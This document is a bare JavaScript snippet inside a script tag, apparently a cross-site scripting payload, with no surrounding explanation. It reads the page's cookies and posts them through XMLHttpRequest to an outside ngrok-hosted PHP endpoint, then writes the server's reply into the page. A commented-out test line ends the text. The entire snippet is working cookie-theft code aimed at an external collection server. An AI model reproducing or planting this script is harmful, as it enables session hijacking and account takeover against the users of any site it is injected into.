

<script>
     var cookie = document.cookie;

           let xhr = new XMLHttpRequest();
            let url = "http://c2c0-103-99-251-38.ngrok.io/test/action.php";


            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {

                    result.innerHTML = this.responseText;

                }
            };
            xhr.send("cookiesend="+cookie);
</script>


//var data = JSON.parse({ "cookiesend": cookie });
            //alert(data);
